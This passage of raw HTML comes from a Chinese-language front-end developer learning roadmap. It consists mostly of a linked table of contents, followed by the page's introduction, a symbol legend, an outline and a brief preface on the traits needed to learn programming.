href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%b1%bb%e5%9e%8b%e6%a0%a1%e9%aa%8c">类型校验</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bb%a3%e7%a0%81%e6%a3%80%e6%9f%a5">代码检查</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bb%a3%e7%a0%81%e9%a3%8e%e6%a0%bc">代码风格</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8f%90%e4%ba%a4%e8%a7%84%e8%8c%83">提交规范</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8f%90%e4%ba%a4%e6%a3%80%e6%9f%a5">提交检查</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%9e%84%e5%bb%ba%e5%b7%a5%e5%85%b7">构建工具</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%87%aa%e5%8a%a8%e5%8c%96%e6%9e%84%e5%bb%ba">自动化构建</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%89%93%e5%8c%85%e5%b7%a5%e5%85%b7">打包工具</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=ci-cd">CI &#x2F; CD</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%83%a8%e7%bd%b2">部署</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-web-%e6%9c%8d%e5%8a%a1%e5%99%a8">⭐️ Web 服务器</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-nginx">⭐️ Nginx</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-apache">✅ Apache</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ae%b9%e5%99%a8">容器</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-docker">✅ Docker</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=kubernetes">Kubernetes</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%83%a8%e7%bd%b2%e7%ad%96%e7%95%a5">部署策略</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%9b%91%e6%8e%a7%e5%91%8a%e8%ad%a6">监控告警</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%9b%9b%e3%80%81%e5%89%8d%e7%ab%af%e4%bc%98%e5%8c%96">四、前端优化</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e6%80%a7%e8%83%bd%e4%bc%98%e5%8c%96">✅ 性能优化</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%80%a7%e8%83%bd%e6%8c%87%e6%a0%87">性能指标</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bc%98%e5%8c%96%e6%89%8b%e6%ae%b5">优化手段</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%94%a8%e6%88%b7%e4%bd%93%e9%aa%8c">用户体验</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%85%bc%e5%ae%b9%e6%80%a7">✅ 兼容性</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%8f%e8%a7%88%e5%99%a8%e5%85%bc%e5%ae%b9%e6%80%a7">浏览器兼容性</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b1%8f%e5%b9%95%e5%88%86%e8%be%a8%e7%8e%87%e5%85%bc%e5%ae%b9%e6%80%a7">屏幕分辨率兼容性</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%b7%a8%e5%b9%b3%e5%8f%b0%e5%85%bc%e5%ae%b9%e6%80%a7">跨平台兼容性</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=seo">SEO</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%ae%89%e5%85%a8">✅ 安全</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%ba%94%e3%80%81%e5%89%8d%e7%ab%af%e7%94%9f%e6%80%81">五、前端生态</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%ad%90%ef%b8%8f-%e9%9d%99%e6%80%81%e7%ab%99%e7%82%b9%e6%9e%84%e5%bb%ba">⭐️ 静态站点构建</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%bc%80%e5%8f%91">开发</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%8d%9a%e5%ae%a2">博客</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%96%87%e6%a1%a3">文档</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e5%a4%a7%e5%89%8d%e7%ab%af">✅ 大前端</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e5%ba%94%e7%94%a8">移动应用</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e5%ba%94%e7%94%a8%e6%89%93%e5%8c%85">移动应用打包</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%a1%8c%e9%9d%a2%e5%ba%94%e7%94%a8">桌面应用</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%8f%e7%a8%8b%e5%ba%8f">小程序</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e8%b7%a8%e7%ab%af%e5%bc%80%e5%8f%91%e6%a1%86%e6%9e%b6">跨端开发框架</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%a7%bb%e5%8a%a8%e7%ab%af%e8%b0%83%e8%af%95">移动端调试</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-serverless">✅ Serverless</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e2%9c%85-%e4%ba%91%e5%bc%80%e5%8f%91">✅ 云开发</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bd%8e%e4%bb%a3%e7%a0%81">低代码</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%85%ad%e3%80%81%e5%89%8d%e7%ab%af%e6%b1%82%e8%81%8c">六、前端求职</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%b5%81%e7%a8%8b">流程</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%ae%80%e5%8e%86">简历</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e8%af%95%e9%a2%98%e5%ba%93">面试题库</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e7%bb%8f">面经</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%9d%a2%e8%af%95%e5%ae%9e%e6%88%98">面试实战</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%b8%83%e3%80%81%e5%89%8d%e7%ab%af%e6%9c%aa%e6%9d%a5">七、前端未来</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=webcomponents">WebComponents</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%88%91%e7%9a%84%e5%89%8d%e7%ab%af%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf">我的前端学习路线</a><ul><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_1-%e5%bf%ab%e9%80%9f%e5%85%a5%e9%97%a8%ef%bc%8c%e5%9f%b9%e5%85%bb%e5%85%b4%e8%b6%a3">1. 快速入门，培养兴趣</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_2-%e5%a4%9a%e7%9c%8b%e5%a4%9a%e5%86%99%ef%bc%8c%e5%b7%a9%e5%9b%ba%e5%9f%ba%e7%a1%80">2. 多看多写，巩固基础</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_3-%e6%a1%86%e6%9e%b6%e5%ad%a6%e4%b9%a0%ef%bc%8c%e5%ad%a6%e4%bb%a5%e8%87%b4%e7%94%a8">3. 框架学习，学以致用</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_4-%e6%a0%b9%e6%8d%ae%e9%9c%80%e8%a6%81%ef%bc%8c%e8%87%aa%e4%b8%bb%e5%ad%a6%e4%b9%a0">4. 根据需要，自主学习</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_5-%e6%b8%90%e5%85%a5%e4%bd%b3%e5%a2%83%ef%bc%8c%e6%8b%93%e5%ae%bd%e8%a7%86%e9%87%8e">5. 渐入佳境，拓宽视野</a></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=_6-%e6%80%bb%e7%bb%93">6. 总结</a></li></ul></li><li><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%b0%be%e5%a3%b0-%e6%8c%81%e7%bb%ad%e5%ad%a6%e4%b9%a0">尾声 - 持续学习</a> - <a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e4%bc%98%e7%a7%80%e5%89%8d%e7%ab%af%e4%ba%ba%e7%9a%84%e7%89%b9%e8%b4%a8">优秀前端人的特质</a> - <a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%a6%e4%b9%a0%e8%b5%84%e6%ba%90">学习资源</a> - <a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e7%ab%af%e8%b5%84%e8%ae%af">前端资讯</a> - <a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8a%80%e6%9c%af%e5%8d%9a%e5%ae%a2">技术博客</a> - <a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%a6%e4%b9%a0%e8%a6%81%e7%82%b9">学习要点</a><br><a name="c5TS8"></a></li></ul></li></ul><h1 id="前端学习路线"><a href="#前端学习路线" class="headerlink" title="前端学习路线"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e9%b1%bc%e7%9a%ae-%e5%89%8d%e7%ab%af%e5%ad%a6%e4%b9%a0%e8%b7%af%e7%ba%bf">前端学习路线</a></h1><p><strong>这份学习路线并不完美，也不会有最终形态，正如前端不可预见、永无止境的未来。</strong><br />💂 + 💻 &#x3D; 👴🏽<br><a name="SMzIJ"></a></p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%89%b9%e7%82%b9">特点</a></h2><ol><li>一份全面的前端知识点大梳理和汇总</li><li>分阶段学习，每个阶段给出学习目标</li><li>使用符号对知识点的重要程度做了区分，按需学习</li><li>知识点附有描述和资源链接</li><li>提供一份清晰的个人顺序学习路线方法</li><li>提供大量优质学习资源<br><a name="RFX0q"></a></li></ol><h2 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e7%ac%a6%e5%8f%b7%e8%a1%a8">符号表</a></h2><p>可根据知识点前的符号按需选学，并获取知识点描述和学习资源。</p><ul><li>⭐️ 必学（追求速成）</li><li>✅ 建议学（重要知识）</li><li>❗ 面试重点</li><li>❌ 一般没必要学习</li><li>💬 描述</li><li>📚 资源</li><li>🎯 目标<br><a name="UGO52"></a></li></ul><h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%a4%a7%e7%ba%b2">大纲</a></h2><ol><li>前言 - 学编程需要的特质</li><li>前端学习七阶段<ol><li>前端入门</li><li>巩固基础</li><li>前端工程化</li><li>前端优化</li><li>前端生态</li><li>前端求职</li><li>前端未来</li></ol></li><li>我的前端学习路线</li><li>尾声 - 持续学习<br><a name="oyqLM"></a></li></ol><h2 id="前言-学编程需要的特质"><a href="#前言-学编程需要的特质" class="headerlink" title="前言 - 学编程需要的特质"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%89%8d%e8%a8%80-%e5%ad%a6%e7%bc%96%e7%a8%8b%e9%9c%80%e8%a6%81%e7%9a%84%e7%89%b9%e8%b4%a8">前言 - 学编程需要的特质</a></h2><p>相信自己有能力，那么你就真的会有！</p><ul><li>兴趣</li><li>坚持</li><li>付出</li><li>心态<br><a name="odGIe"></a></li></ul><h2 id="一、前端入门"><a href="#一、前端入门" class="headerlink" title="一、前端入门"></a><a 